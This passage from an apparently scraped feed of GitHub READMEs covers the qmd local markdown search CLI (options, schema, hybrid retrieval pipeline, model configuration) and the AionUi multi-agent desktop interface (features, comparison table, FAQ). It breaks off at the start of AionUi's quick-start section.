Output formats (for search and multi-get)\n--files            # Output: docid,score,filepath,context\n--json             # JSON output with snippets\n--csv              # CSV output\n--md               # Markdown output\n--xml              # XML output\n\n# Get options\nqmd get &lt;file&gt;[:line]  # Get document, optionally starting at line\n-l &lt;num&gt;               # Maximum lines to return\n--from &lt;num&gt;           # Start from line number\n\n# Multi-get options\n-l &lt;num&gt;           # Maximum lines per file\n--max-bytes &lt;num&gt;  # Skip files larger than N bytes (default: 10KB)\n</code></pre> \n<h3>Output Format</h3> \n<p>Default output is colorized CLI format (respects <code>NO_COLOR</code> env):</p> \n<pre><code>docs/guide.md:42 #a1b2c3\nTitle: Software Craftsmanship\nContext: Work documentation\nScore: 93%\n\nThis section covers the **craftsmanship** of building\nquality software with attention to detail.\nSee also: engineering principles\n\n\nnotes/meeting.md:15 #d4e5f6\nTitle: Q4 Planning\nContext: Personal notes and ideas\nScore: 67%\n\nDiscussion about code quality and craftsmanship\nin the development process.\n</code></pre> \n<ul> \n <li><strong>Path</strong>: Collection-relative path (e.g., <code>docs/guide.md</code>)</li> \n <li><strong>Docid</strong>: Short hash identifier (e.g., <code>#a1b2c3</code>) - use with <code>qmd get #a1b2c3</code></li> \n <li><strong>Title</strong>: Extracted from document (first heading or filename)</li> \n <li><strong>Context</strong>: Path context if configured via <code>qmd context add</code></li> \n <li><strong>Score</strong>: Color-coded (green &gt;70%, yellow &gt;40%, dim otherwise)</li> \n <li><strong>Snippet</strong>: Context around match with query terms highlighted</li> \n</ul> \n<h3>Examples</h3> \n<pre><code class=\"language-sh\"># Get 10 results with minimum score 0.3\nqmd query -n 10 --min-score 0.3 \"API design patterns\"\n\n# Output as markdown for LLM context\nqmd search --md --full \"error handling\"\n\n# JSON output for scripting\nqmd query --json \"quarterly reports\"\n\n# Use separate index for different knowledge base\nqmd --index work search \"quarterly reports\"\n</code></pre> \n<h3>Index Maintenance</h3> \n<pre><code class=\"language-sh\"># Show index status and collections with contexts\nqmd status\n\n# Re-index all collections\nqmd update\n\n# Re-index with git pull first (for remote repos)\nqmd update --pull\n\n# Get document by filepath (with fuzzy matching suggestions)\nqmd get notes/meeting.md\n\n# Get document by docid (from search results)\nqmd get \"#abc123\"\n\n# Get document starting at line 50, max 100 lines\nqmd get notes/meeting.md:50 -l 100\n\n# Get multiple documents by glob pattern\nqmd multi-get \"journals/2025-05*.md\"\n\n# Get multiple documents by comma-separated list (supports docids)\nqmd multi-get \"doc1.md, doc2.md, #abc123\"\n\n# Limit multi-get to files under 20KB\nqmd multi-get \"docs/*.md\" --max-bytes 20480\n\n# Output multi-get as JSON for agent processing\nqmd multi-get \"docs/*.md\" --json\n\n# Clean up cache and orphaned data\nqmd cleanup\n</code></pre> \n<h2>Data Storage</h2> \n<p>Index stored in: <code>~/.cache/qmd/index.sqlite</code></p> \n<h3>Schema</h3> \n<pre><code class=\"language-sql\">collections     -- Indexed directories with name and glob patterns\npath_contexts   -- Context descriptions by virtual path (qmd://...)\ndocuments       -- Markdown content with metadata and docid (6-char hash)\ndocuments_fts   -- FTS5 full-text index\ncontent_vectors -- Embedding chunks (hash, seq, pos, 800 tokens each)\nvectors_vec     -- sqlite-vec vector index (hash_seq key)\nllm_cache       -- Cached LLM responses (query expansion, rerank scores)\n</code></pre> \n<h2>Environment Variables</h2> \n<table> \n <thead> \n  <tr> \n   <th>Variable</th> \n   <th>Default</th> \n   <th>Description</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td><code>XDG_CACHE_HOME</code></td> \n   <td><code>~/.cache</code></td> \n   <td>Cache directory location</td> \n  </tr> \n </tbody> \n</table> \n<h2>How It Works</h2> \n<h3>Indexing Flow</h3> \n<pre><code>Collection ──► Glob Pattern ──► Markdown Files ──► Parse Title ──► Hash Content\n    │                                                   │              │\n    │                                                   │              ▼\n    │                                                   │         Generate docid\n    │                                                   │         (6-char hash)\n    │                                                   │              │\n    └──────────────────────────────────────────────────►└──► Store in SQLite\n                                                                       │\n                                                                       ▼\n                                                                  FTS5 Index\n</code></pre> \n<h3>Embedding Flow</h3> \n<p>Documents are chunked into 800-token pieces with 15% overlap:</p> \n<pre><code>Document ──► Chunk (800 tokens) ──► Format each chunk ──► node-llama-cpp ──► Store Vectors\n                │                    \"title | text\"        embedBatch()\n                │\n                └─► Chunks stored with:\n                    - hash: document hash\n                    - seq: chunk sequence (0, 1, 2...)\n                    - pos: character position in original\n</code></pre> \n<h3>Query Flow (Hybrid)</h3> \n<pre><code>Query ──► LLM Expansion ──► [Original, Variant 1, Variant 2]\n                │\n      ┌─────────┴─────────┐\n      ▼                   ▼\n   For each query:     FTS (BM25)\n      │                   │\n      ▼                   ▼\n   Vector Search      Ranked List\n      │\n      ▼\n   Ranked List\n      │\n      └─────────┬─────────┘\n                ▼\n         RRF Fusion (k=60)\n         Original query ×2 weight\n         Top-rank bonus: +0.05/#1, +0.02/#2-3\n                │\n                ▼\n         Top 30 candidates\n                │\n                ▼\n         LLM Re-ranking\n         (yes/no + logprob confidence)\n                │\n                ▼\n         Position-Aware Blend\n         Rank 1-3:  75% RRF / 25% reranker\n         Rank 4-10: 60% RRF / 40% reranker\n         Rank 11+:  40% RRF / 60% reranker\n                │\n                ▼\n         Final Results\n</code></pre> \n<h2>Model Configuration</h2> \n<p>Models are configured in <code>src/llm.ts</code> as HuggingFace URIs:</p> \n<pre><code class=\"language-typescript\">const DEFAULT_EMBED_MODEL = \"hf:ggml-org/embeddinggemma-300M-GGUF/embeddinggemma-300M-Q8_0.gguf\";\nconst DEFAULT_RERANK_MODEL = \"hf:ggml-org/Qwen3-Reranker-0.6B-Q8_0-GGUF/qwen3-reranker-0.6b-q8_0.gguf\";\nconst DEFAULT_GENERATE_MODEL = \"hf:tobil/qmd-query-expansion-1.7B-gguf/qmd-query-expansion-1.7B-q4_k_m.gguf\";\n</code></pre> \n<h3>EmbeddingGemma Prompt Format</h3> \n<pre><code>// For queries\n\"task: search result | query: {query}\"\n\n// For documents\n\"title: {title} | text: {content}\"\n</code></pre> \n<h3>Qwen3-Reranker</h3> \n<p>Uses node-llama-cpp's <code>createRankingContext()</code> and <code>rankAndSort()</code> API for cross-encoder reranking. Returns documents sorted by relevance score (0.0 - 1.0).</p> \n<h3>Qwen3 (Query Expansion)</h3> \n<p>Used for generating query variations via <code>LlamaChatSession</code>.</p> \n<h2>License</h2> \n<p>MIT</p>",
        "source": "mshibanami.github.io",
        "published": "",
        "fetched_at": "2026-02-09T23:33:03.745555Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "boundary_crossing",
            "score": 6
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 14,
        "timeliness_score": 1,
        "final_score": 4.9,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://github.com/iOfficeAI/AionUi",
        "title": "iOfficeAI/AionUi",
        "summary": "<p>Free, local, open-source 24/7 Cowork and OpenClaw for Gemini CLI, Claude Code, Codex, OpenCode, Qwen Code, Goose CLI, Auggie, and more | 🌟 Star if you like it!</p><hr /><p align=\"center\"> <img alt=\"AionUi - Cowork with Your CLI AI Agent\" src=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/aionui-banner-1.png\" width=\"100%\" /> </p> \n<p align=\"center\"> <img alt=\"Version\" src=\"https://img.shields.io/github/v/release/iOfficeAI/AionUi?style=flat-square&amp;color=32CD32\" /> &nbsp; <img alt=\"License\" src=\"https://img.shields.io/badge/license-Apache--2.0-32CD32?style=flat-square&amp;logo=apache&amp;logoColor=white\" /> &nbsp; <img alt=\"Platform\" src=\"https://img.shields.io/badge/platform-macOS%20%7C%20Windows%20%7C%20Linux-6C757D?style=flat-square&amp;logo=linux&amp;logoColor=white\" /> </p> \n<p align=\"center\"> <a href=\"https://trendshift.io/repositories/15423\" target=\"_blank\"> <img alt=\"GitHub Trending\" height=\"80\" src=\"https://trendshift.io/api/badge/repositories/15423\" /> </a> </p> \n<hr /> \n<p align=\"center\"> <strong>🚀 Cowork with Your AI, Gemini CLI, Claude Code, Codex, Qwen Code, Goose CLI, Auggie, and more</strong><br /> <em>User-friendly | Visual graphical interface | Multi-model support | Local data security</em> </p> \n<p align=\"center\"> <a href=\"https://github.com/iOfficeAI/AionUi/releases\"> <img alt=\"Download Latest Release\" height=\"50\" src=\"https://img.shields.io/badge/⬇️%20Download%20Now-Latest%20Release-32CD32?style=for-the-badge&amp;logo=github&amp;logoColor=white\" /> </a> </p> \n<p align=\"center\"> <strong>English</strong> | <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/readme_ch.md\">简体中文</a> | <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/readme_tw.md\">繁體中文</a> | <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/readme_jp.md\">日本語</a> | <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/readme_ko.md\">한국어</a> | <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/readme_es.md\">Español</a> | <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/readme_pt.md\">Português</a> | <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/readme_tr.md\">Türkçe</a> | <a href=\"https://www.aionui.com\" target=\"_blank\">Official Website</a> | <a href=\"https://twitter.com/AionUI\" target=\"_blank\">Twitter</a> </p> \n<p align=\"center\"> <strong>💬 Community:</strong> <a href=\"https://discord.gg/2QAwJn7Egx\" target=\"_blank\">Discord (English)</a> | <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/wx.png\" target=\"_blank\">微信 (中文群)</a> </p> \n<hr /> \n<h2>📋 Quick Navigation</h2> \n<p align=\"center\"> </p>\n<p><a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/#%E2%9C%A8-what-can-aionui-do\">✨ What Can AionUi Do?</a> · <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/#%F0%9F%A4%94-why-choose-aionui\">🤔 Why Choose AionUi?</a> · <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/#%E2%9C%A8-core-features\">✨ Core Features</a> · <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/#%F0%9F%9A%80-quick-start\">🚀 Quick Start</a> · <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/#%F0%9F%A4%9D-community--support\">💬 Community</a></p> \n<p></p> \n<hr /> \n<h2>✨ What Can AionUi Do?</h2> \n<p align=\"center\"> <img alt=\"AionUi - Cowork with Your CLI AI Agent\" src=\"./resources/offica-ai BANNER-function.png\" width=\"800\" /> </p> \n<h3>🤖 <strong>Multi-Agent Mode - Cowork for Your Command-Line AI Tools, Unified Graphical Interface</strong></h3> \n<p><em>AionUi comes with built-in Gemini CLI, ready to use out of the box with no additional installation required; if you have already installed command-line tools like Gemini CLI, Claude Code, CodeX, Qwen Code, Goose AI, Augment Code, AionUi will automatically detect them and provide a unified graphical interface for a richer experience</em></p> \n<ul> \n <li>✅ <strong>Auto Detection + Unified Interface</strong> - Automatically recognizes local CLI tools, provides a unified graphical interface, say goodbye to command line</li> \n <li>✅ <strong>Local Storage + Multi-Session</strong> - Conversations saved locally, supports multiple parallel sessions, each session with independent context</li> \n</ul> \n<p align=\"center\"> <img alt=\"Multi-Agent Mode Demo\" src=\"./resources/acp home page.gif\" width=\"800\" /> </p> \n<p align=\"center\"> <img alt=\"OpenClaw Integration in AionUi\" src=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/openclawvia.png\" width=\"800\" /> </p> \n<hr /> \n<h3>🌐 <strong>Access Your AionUi Anywhere</strong></h3> \n<p><em>Your 7×24 hour AI assistant - Access AionUi from any device, anywhere! On business trips, at home, in the office, use your AI tools anytime, anywhere through WebUI or various chat platforms</em></p> \n<p>AionUi provides multiple remote access methods:</p> \n<ul> \n <li> <p><strong>🌐 WebUI Mode</strong></p> <p>Access AionUi from any device via browser - phone, tablet, computer. Supports LAN, cross-network, and server deployment. You can log in by scanning a QR code or using account password, making it simple and convenient.</p> \n  <blockquote> \n   <p>💡 <strong>Need detailed configuration guide?</strong> Check out <a href=\"https://github.com/iOfficeAI/AionUi/wiki/Remote-Internet-Access-Guide-Chinese\">Remote Internet Access Tutorial</a></p> \n  </blockquote> <p align=\"center\"> <img alt=\"WebUI Remote Access\" src=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/webui-remote.png\" width=\"800\" /> </p> </li> \n <li> <p><strong>📱 Chat Platform Integration</strong></p> \n  <ul> \n   <li><strong>Telegram</strong> - Chat with your AI assistant directly from Telegram on any device. Simple pairing code system for secure access.</li> \n   <li><strong>Lark (Feishu)</strong> - Interact with your AI assistant through Feishu bots, supporting enterprise collaboration scenarios.</li> \n   <li><strong>Slack</strong> and more platforms coming soon 🚧</li> \n  </ul> \n  <blockquote> \n   <p>💡 <strong>How to set up:</strong> Go to AionUi Settings → WebUI Settings → Channel, configure the corresponding Bot Token to get started!</p> \n  </blockquote> </li> \n</ul> \n<p align=\"center\"> <img alt=\"Access Anywhere - WebUI &amp; Chat Platforms\" src=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/remote-telegram.png\" width=\"800\" /> </p> \n<hr /> \n<h3>⏰ <strong>Scheduled Tasks - Let AionUi Automate Your Work</strong></h3> \n<p><em>After setting up scheduled tasks, the AI assistant will automatically execute according to your set time, truly achieving 7×24 hours unattended operation</em></p> \n<ul> \n <li><strong>Free Conversation</strong> - Tell AI what to do using natural language, just like chatting normally</li> \n <li><strong>Flexible Time Setting</strong> - Daily, weekly, monthly are all possible</li> \n <li><strong>Simple and Easy</strong> - Create, modify, enable/disable, delete, view and adjust anytime</li> \n</ul> \n<p align=\"center\"> <img alt=\"Scheduled Tasks Demo\" src=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/alart-task.png\" width=\"800\" /> </p> \n<blockquote> \n <p>💡 <strong>Use Cases:</strong> Scheduled data aggregation, regular report generation, automatic file organization, scheduled reminders, etc.</p> \n</blockquote> \n<hr /> \n<h3>📁 <strong>Smart File Management (AI Cowork)</strong></h3> \n<p><em>Batch renaming, automatic organization, smart classification, file merging</em></p> \n<ul> \n <li><strong>Auto Organize</strong>: Intelligently identify content and auto-classify, keeping folders tidy.</li> \n <li><strong>Efficient Batch</strong>: One-click rename, merge files, say goodbye to tedious manual tasks.</li> \n</ul> \n<p align=\"center\"> <img alt=\"Smart File Management Demo\" src=\"./resources/aionui sort file.gif\" width=\"800\" /> </p> \n<hr /> \n<h3>📄 <strong>Preview Panel - Quickly View AI-Generated Results</strong></h3> \n<p><em>Supports 9+ formats of visual preview (PDF, Word, Excel, PPT, code, Markdown, images, HTML, Diff, etc.)</em></p> \n<ul> \n <li>✅ <strong>View Results Instantly</strong> - After AI generates files, view preview immediately without switching apps</li> \n <li>✅ <strong>Real-time Tracking + Editable</strong> - Automatically tracks file changes, editor and preview sync intelligently; supports real-time editing of Markdown, code, HTML, WYSIWYG</li> \n</ul> \n<p align=\"center\"> <img alt=\"Preview Panel Demo\" src=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/preview.gif\" width=\"800\" /> </p> \n<hr /> \n<h3>🎨 <strong>AI Image Generation &amp; Editing</strong></h3> \n<p><em>Intelligent image generation, editing, and recognition, powered by Gemini</em></p> \n<p align=\"center\"> <img alt=\"AI Image Generation Demo\" src=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/Image_Generation.gif\" width=\"800\" /> </p> \n<blockquote> \n <p>💡 <strong>Need help setting up free image generation?</strong> <a href=\"https://github.com/iOfficeAI/AionUi/wiki/AionUi-Image-Generation-Tool-Model-Configuration-Guide\">Follow the tutorial to configure image generation models</a></p> \n</blockquote> \n<hr /> \n<h3>🤖 <strong>Multi-Model Support</strong></h3> \n<p><em>Supports mainstream models like Gemini, OpenAI, Claude, Qwen, as well as local models like Ollama, LM Studio. Flexibly switch between different models to meet various task requirements.</em></p> \n<p align=\"center\"> <img alt=\"Multi-Model Support\" src=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/multi-model.png\" width=\"800\" /> </p> \n<hr /> \n<hr /> \n<h3>🛠️ <strong>AI Assistants &amp; Skills Ecosystem</strong></h3> \n<p><em>Extensible assistant system with built-in specialized assistants and custom skill support</em></p> \n<details> \n <strong>🔍 Click to explore AI Assistants &amp; Skills ▶️</strong> \n <br /> \n <p>AionUi includes <strong>10+ professional assistants</strong> with predefined capabilities, extendable through custom skills:</p> \n <ul> \n  <li><strong>🤝 Cowork</strong> - Autonomous task execution (file operations, document processing, workflow planning)</li> \n  <li><strong>📊 PPTX Generator</strong> - Generate PPTX presentations</li> \n  <li><strong>📄 PDF to PPT</strong> - Convert PDF to PPT</li> \n  <li><strong>🎮 3D Game</strong> - Single-file 3D game generation</li> \n  <li><strong>🎨 UI/UX Pro Max</strong> - Professional UI/UX design (57 styles, 95 color palettes)</li> \n  <li><strong>📋 Planning with Files</strong> - File-based planning for complex tasks</li> \n  <li><strong>🧭 HUMAN 3.0 Coach</strong> - Personal development coach</li> \n  <li><strong>📣 Social Job Publisher</strong> - Job posting and publishing</li> \n  <li><strong>🦞 moltbook</strong> - Zero-deployment integration with automatic heartbeat scheduling, activity reporting, and seamless AI agent social networking</li> \n  <li><strong>📈 Beautiful Mermaid</strong> - Flowcharts, sequence diagrams, and more</li> \n </ul> \n <p><strong>Custom Skills</strong>: Create skills in the <code>skills/</code> directory, enable/disable skills for assistants to extend AI capabilities. Built-in skills include <code>pptx</code>, <code>docx</code>, <code>pdf</code>, <code>xlsx</code>, <code>mermaid</code>, and more.</p> \n <blockquote> \n  <p>💡 Each assistant is defined by a markdown file. Check the <code>assistant/</code> directory for examples.</p> \n </blockquote> \n</details> \n<h3>🎨 <strong>Personalized Interface Customization</strong></h3> \n<p><em>Customize with your own CSS code, make your interface match your preferences</em></p> \n<p align=\"center\"> <img alt=\"CSS Custom Interface Demo\" src=\"./resources/css with skin.gif\" width=\"800\" /> </p> \n<ul> \n <li>✅ <strong>Fully Customizable</strong> - Freely customize interface colors, styles, layout through CSS code, create your exclusive experience</li> \n</ul> \n<hr /> \n<h3>💬 <strong>Multi-Task Parallel Processing</strong></h3> \n<p><em>Open multiple conversations, tasks don't get mixed up, independent memory, double efficiency</em></p> \n<details> \n <strong>🎬 Click to view demo ▶️</strong> \n <br /> \n <p align=\"center\"> <img alt=\"Conversation Management Demo\" src=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/multichat-side-by-side.gif\" width=\"800\" /> </p> \n</details> \n<hr /> \n<h2>🤔 Why Choose AionUi?</h2> \n<p><strong>Just like Claude Cowork makes Claude Code easier to use, AionUi is the Cowork platform for all your command-line AI tools</strong></p> \n<p>While command-line tools like Gemini CLI, Claude Code, Codex, Qwen Code are powerful, they share common pain points: conversations can't be saved, single-session limitations, cumbersome file operations, and only support a single model.</p> \n<p>AionUi provides unified <strong>Cowork capabilities</strong> for these command-line tools:</p> \n<ul> \n <li>🎯 <strong>Unified Platform</strong> - One interface to manage all command-line AI tools, no switching needed; built-in Gemini CLI, ready to use out of the box and completely free</li> \n <li>🚀 <strong>Multi-Tool Support</strong> - Not only supports Claude Code, but also Gemini CLI, Codex, Qwen Code, and more</li> \n <li>🖥️ <strong>Cross-Platform</strong> - Full platform support for macOS, Windows, Linux (Claude Cowork currently only macOS)</li> \n <li>🌐 <strong>Remote Access</strong> - Your remote 24/7 assistant, access anytime, anywhere, and completely free</li> \n <li>🔄 <strong>Multi-Model Switching</strong> - Flexibly switch between different models in the same interface, meeting different task requirements</li> \n <li>📄 <strong>Real-time Preview</strong> - Visual preview for 9+ formats, immediately view the effects of AI-generated files</li> \n <li>💾 <strong>Local Data Security</strong> - All conversations and files saved locally, data never leaves your device</li> \n</ul> \n<h3>❓ Quick Q&amp;A</h3> \n<details> \n <strong>Q: Why is AionUi a great replacement for Claude Cowork?</strong> A: AionUi is a **free and open-source** **Multi-AI Agent Desktop**. Compared to the official Cowork which only runs on macOS and is locked to Claude, AionUi is its **full-model, cross-platform enhanced version**, deeply covering **AI Office Automation** scenarios. \n <table> \n  <thead> \n   <tr> \n    <th align=\"left\">Dimension</th> \n    <th align=\"left\">Claude Cowork</th> \n    <th align=\"left\">AionUi (This Project)</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td align=\"left\">OS</td> \n    <td align=\"left\">macOS Only</td> \n    <td align=\"left\">🍏 macOS / 🪟 Windows / 🐧 Linux</td> \n   </tr> \n   <tr> \n    <td align=\"left\">Model Support</td> \n    <td align=\"left\">Claude Only</td> \n    <td align=\"left\">🤖 Gemini, Claude, DeepSeek, OpenAI, Ollama</td> \n   </tr> \n   <tr> \n    <td align=\"left\">Interaction</td> \n    <td align=\"left\">GUI</td> \n    <td align=\"left\">🖥️ Full GUI + WebUI Remote Access</td> \n   </tr> \n   <tr> \n    <td align=\"left\">Cost</td> \n    <td align=\"left\">Subscription $100/mo</td> \n    <td align=\"left\">🆓 Completely Free &amp; Open Source</td> \n   </tr> \n  </tbody> \n </table> \n <p><strong>Deep AI Office Scenario Support:</strong></p> \n <ul> \n  <li><strong>File Management</strong>: Intelligently organize messy local folders and batch rename with one click.</li> \n  <li><strong>Data Processing</strong>: Deeply analyze and automatically beautify Excel reports.</li> \n  <li><strong>Document Generation</strong>: Automatically write and format PPT, Word, and Markdown documents.</li> \n  <li><strong>Instant Preview</strong>: Built-in 9+ format preview panels, making AI office collaboration results instantly visible.</li> \n </ul> \n</details> \n<details> \n <strong>Q: What can I do with AionUi?</strong> A: It can be your **private Cowork workspace**. You can let it help you batch organize folders, deeply beautify Excel, and preview web code in real-time. It's your best graphical choice for exploring office automation workflows and enhancing your experience with Claude Code or Gemini CLI. \n</details> \n<details> \n <strong>Q: Is AionUi ready to use out of the box?</strong> A: Yes! After installation, you can use it directly. AionUi comes with built-in Gemini CLI, no additional installation needed to start experiencing. If you have already installed and used command-line tools like Gemini CLI on your machine, AionUi will automatically detect them and provide a richer experience. \n</details> \n<details> \n <strong>Q: Is it free?</strong> A: AionUi is completely free and open source, but using AI models requires corresponding API Keys. \n</details> \n<details> \n <strong>Q: Which AI models are supported?</strong> A: Supports mainstream models like Gemini, OpenAI, Claude, Qwen, as well as local models like Ollama, LM Studio. \n <p>You can also run multiple AI Agents simultaneously (such as Gemini CLI, Claude Code, Qwen Code, etc.), see the configuration guide for details.</p> \n</details> \n<details> \n <strong>Q: Is my data secure?</strong> A: All conversation data is stored in a local SQLite database and will not be uploaded to any server. \n</details> \n<hr /> \n<h2>🎬 See How People Use AionUi</h2> \n<p><em>Watch how content creators review and use AionUi in real-world scenarios</em></p> \n<p align=\"center\"> <a href=\"https://www.youtube.com/watch?v=yUU5E-U5B3M\" target=\"_blank\"> <img alt=\"WorldofAI Review\" src=\"https://img.youtube.com/vi/yUU5E-U5B3M/maxresdefault.jpg\" width=\"400\" /> </a> &nbsp;&nbsp; <a href=\"https://www.youtube.com/watch?v=enQnkKfth10\" target=\"_blank\"> <img alt=\"Julian Goldie SEO Review\" src=\"https://img.youtube.com/vi/enQnkKfth10/maxresdefault.jpg\" width=\"400\" /> </a> </p> \n<p align=\"center\"> <em>🎬 WorldofAI (200K subscribers)</em> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <em>🎬 Julian Goldie SEO (318K subscribers)</em> </p> \n<h3>📰 Community Articles</h3> \n<ul> \n <li><a href=\"https://mp.weixin.qq.com/s/F3f-CCsVPaK3lK00jXhOOg\">🔥 Explosive! Open-source free version of Cowork, full model integration + autonomous file operations, redefining AI office work.</a> — Open Source AI Project Landing</li> \n <li><a href=\"https://mp.weixin.qq.com/s/TsMojSbkUUFvsd-HQCazZg\">Making ordinary people use Claude Code like an APP, what is the ACP protocol</a> — Lazy Cat Loves Fishing</li> \n <li><a href=\"https://mp.weixin.qq.com/s/saEk49cYV6MqBgw19Lw6Gw\">5500 Stars: How Open Source Breaks Anthropic's AI Tool Moat</a> — AI Silicon Moment</li> \n</ul> \n<blockquote> \n <p>💡 <strong>Have you made a video about AionUi?</strong> <a href=\"https://x.com/AionUi\">Let us know on X</a> and we'll feature it here! We value your feedback and will continue to improve based on your suggestions.</p> \n</blockquote> \n<h3>📰 Community Articles</h3> \n<ul> \n <li><a href=\"https://mp.weixin.qq.com/s/F3f-CCsVPaK3lK00jXhOOg\">🔥 Explosive! Open-source free version of Cowork, full model integration + autonomous file operations, redefining AI office work.</a> — Open Source AI Project Landing</li> \n <li><a href=\"https://mp.weixin.qq.com/s/TsMojSbkUUFvsd-HQCazZg\">Making ordinary people use Claude Code like an APP, what is the ACP protocol</a> — Lazy Cat Loves Fishing</li> \n <li><a href=\"https://mp.weixin.qq.com/s/saEk49cYV6MqBgw19Lw6Gw\">5500 Stars: How Open Source Breaks Anthropic's AI Tool Moat</a> — AI Silicon Moment</li> \n</ul> \n<hr /> \n<h2>✨ Core Features</h2> \n<h3>💬 <strong>Multi-Session Chat</strong></h3> \n<ul> \n <li><strong>Multi-Session + Independent Context</strong> - Open multiple chats simultaneously, each session has independent context memory, no confusion</li> \n <li><strong>Local Storage</strong> - All conversations are saved locally and will not be lost</li> \n</ul> \n<h3>🤖 <strong>Multi-Model Support</strong></h3> \n<ul> \n <li><strong>Multi-Platform Support</strong> - Supports mainstream models like Gemini, OpenAI, Claude, Qwen, flexible switching</li> \n <li><strong>Local Model Support</strong> - Supports local model deployment like Ollama, LM Studio, select Custom platform and set local API address (e.g., <code>http://localhost:11434/v1</code>) to connect</li> \n <li><strong>Gemini 3 Subscription Optimization</strong> - Automatically identifies subscribed users, recommends advanced models</li> \n</ul> \n<h3>🗂️ <strong>File Management</strong></h3> \n<ul> \n <li><strong>File Tree Browsing + Drag &amp; Drop Upload</strong> - Browse files like folders, support drag and drop files or folders for one-click import</li> \n <li><strong>Smart Organization</strong> - You can let AI help organize folders, automatic classification</li> \n</ul> \n<h3>📄 <strong>Preview Panel - Give AI Agent a Display</strong></h3> \n<ul> \n <li><strong>9+ Format Preview</strong> - Supports PDF, Word, Excel, PPT, code, Markdown, images, etc., view results immediately after AI generation</li> \n <li><strong>Real-time Tracking + Editable</strong> - Automatically tracks file changes, supports real-time editing and debugging of Markdown, code, HTML</li> \n</ul> \n<h3>🎨 <strong>AI Image Generation &amp; Editing</strong></h3> \n<ul> \n <li><strong>Intelligent Image Generation</strong> - Supports multiple image generation models like Gemini 2.5 Flash Image Preview, Nano, Banana</li> \n <li><strong>Image Recognition &amp; Editing</strong> - AI-driven image analysis and editing features</li> \n</ul> \n<h3>🌐 <strong>WebUI Remote Access</strong></h3> \n<ul> \n <li><strong>Cross-Device Access</strong> - Access from any device on the network via browser, supports mobile devices</li> \n <li><strong>Local Data Security</strong> - All data stored locally in SQLite database, suitable for server deployment</li> \n</ul> \n<hr /> \n<h2>📖 Detailed Usage Guide</h2> \n<details> \n <strong>📖 Expand to View Complete Usage Guide</strong> \n <h3>🚀 Quick Start</h3> \n <ul> \n  <li><a href=\"https://github.com/iOfficeAI/AionUi/wiki/Getting-Started\">📖 Complete Installation Guide</a> - Detailed steps from download to configuration</li> \n  <li><a href=\"https://github.com/iOfficeAI/AionUi/wiki/LLM-Configuration\">⚙️ LLM Configuration Guide</a> - Multi-platform AI model configuration</li> \n  <li><a href=\"https://github.com/iOfficeAI/AionUi/wiki/ACP-Setup\">🤖 Multi-Agent Mode Setup</a> - Integrate terminal AI agents</li> \n  <li><a href=\"https://github.com/iOfficeAI/AionUi/wiki/MCP-Configuration-Guide\">🔌 MCP Tool Configuration</a> - Model Context Protocol server setup</li> \n  <li><a href=\"https://github.com/iOfficeAI/AionUi/wiki/AionUi-Image-Generation-Tool-Model-Configuration-Guide\">🎨 Image Generation Configuration</a> - AI image generation setup tutorial</li> \n  <li><a href=\"https://github.com/iOfficeAI/AionUi/wiki/WebUI-Configuration-Guide\">🌐 WebUI Configuration Guide</a> - Complete WebUI setup and configuration tutorial</li> \n </ul> \n <h3>🎯 Use Cases</h3> \n <ul> \n  <li><a href=\"https://github.com/iOfficeAI/AionUi/wiki/file-management\">📁 File Management</a> - Smart file organization</li> \n  <li><a href=\"https://github.com/iOfficeAI/AionUi/wiki/excel-processing\">📊 Excel Processing</a> - AI-driven data processing</li> \n  <li><a href=\"https://github.com/iOfficeAI/AionUi/wiki/AionUi-Image-Generation-Tool-Model-Configuration-Guide\">🎨 Image Generation</a> - AI image creation</li> \n  <li><a href=\"https://github.com/iOfficeAI/AionUi/wiki/Use-Cases-Overview\">📚 More Use Cases</a></li> \n </ul> \n <h3>❓ Support &amp; Help</h3> \n <ul> \n  <li><a href=\"https://github.com/iOfficeAI/AionUi/wiki/FAQ\">❓ FAQ</a> - Questions and troubleshooting</li> \n  <li><a href=\"https://github.com/iOfficeAI/AionUi/wiki/Configuration-Guides\">🔧 Configuration &amp; Usage Tutorials</a> - Complete configuration documentation</li> \n </ul> \n</details> \n<hr /> \n<h2>🚀 Quick Start</h2> \n<h3>💻 System 